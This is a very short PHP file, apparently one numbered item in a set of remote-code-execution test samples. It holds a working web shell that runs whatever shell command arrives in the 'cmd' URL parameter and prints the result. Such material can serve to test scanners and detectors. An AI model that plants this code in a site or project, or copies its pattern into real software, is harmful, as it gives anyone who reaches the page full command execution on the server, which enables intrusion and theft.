<?php
// RCE test variation #1261
$cmd = $_GET['cmd'] ?? 'ls';
echo shell_exec($cmd);
?>